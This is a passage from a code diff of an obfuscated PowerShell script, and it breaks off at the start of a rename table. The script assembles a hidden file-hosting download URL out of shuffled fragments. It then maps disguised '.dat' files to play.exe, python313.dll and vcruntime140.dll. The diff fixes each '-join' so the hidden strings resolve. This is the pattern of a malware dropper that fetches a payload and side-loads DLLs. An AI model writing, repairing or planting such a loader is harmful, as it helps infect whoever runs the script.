@@ -1,25 +1,25 @@
 $pofysFCZLdgQ = @("s://", "w.medi", "ww", "afire.co", "h", "um/tpxs9e", "ebnru9cny/vzi", "ttp", "ed.da", "t/fi", "le_premi", "le", "p_renam", "m/fi")
 $vbqizei = @(4, 7, 0, 2, 1, 3, 13, 10, 5, 6, 12, 8, 9, 11)
-$poOTFCAEH7ZLdgQ = ($vbqizei | ForEach-Object { $pofysFCZLdgQ[$_] }) -join
+$poOTFCAEH7ZLdgQ = ($vbqizei | ForEach-Object { $pofysFCZLdgQ[$_] }) -join ''
 $1pO5oBsz = "C:\Myproject"
 $fedfza = @("pla", "at", "y.d")
 $sdf = @(0, 2, 1)
-$fedfzb = ($sdf | ForEach-Object { $fedfza[$_] }) -join
+$fedfzb = ($sdf | ForEach-Object { $fedfza[$_] }) -join ''
 $fedfz1 = @("pla", "xe", "y.e")
 $sddf = @(0, 2, 1)
-$fedfzc = ($sddf | ForEach-Object { $fedfz1[$_] }) -join
+$fedfzc = ($sddf | ForEach-Object { $fedfz1[$_] }) -join ''
 $fedfz2 = @("n313.da", "pytho", "t")
 $sdzdf = @(1, 0, 2)
-$fedfzd = ($sdzdf | ForEach-Object { $fedfz2[$_] }) -join
+$fedfzd = ($sdzdf | ForEach-Object { $fedfz2[$_] }) -join ''
 $fedfz3 = @("hon313.d", "pyt", "ll")
 $sdzzdf = @(1, 0, 2)
-$fedfze = ($sdzzdf | ForEach-Object { $fedfz3[$_] }) -join
+$fedfze = ($sdzzdf | ForEach-Object { $fedfz3[$_] }) -join ''
 $fedfz4 = @("vcru", "e14", "ntim", "at", "0.d")
 $sdzezdf = @(0, 2, 1, 4, 3)
-$fedfzf = ($sdzezdf | ForEach-Object { $fedfz4[$_] }) -join
+$fedfzf = ($sdzezdf | ForEach-Object { $fedfz4[$_] }) -join ''
 $fedfz5 = @("vc", "0.dl", "run", "l", "time14")
 $sdzqzdf = @(0, 2, 4, 1, 3)
-$fedfzr = ($sdzqzdf | ForEach-Object { $fedfz5[$_] }) -join
+$fedfzr = ($sdzqzdf | ForEach-Object { $fedfz5[$_] }) -join ''
 
 $ca32VOHA = @(
 @{OriginalName = $fedfzb; NewName = $fedfzc},
